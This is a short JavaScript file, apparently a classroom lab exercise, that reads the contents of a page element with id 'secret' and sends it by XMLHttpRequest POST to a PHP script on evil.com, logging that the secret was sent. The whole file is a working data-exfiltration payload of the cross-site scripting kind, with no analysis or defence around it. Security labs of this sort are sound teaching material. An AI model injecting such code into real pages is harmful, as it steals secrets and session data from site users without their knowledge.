secret = document.getElementById("secret").innerText

// Impossible to put the mode no-cors in a XMLHttpRequest
// send the secret to evil.com with a XMLHttpRequest
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://evil.com:8080/tp3/mycode/get_secret.php", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("secret=" + secret);

console.log("secret sent to evil.com");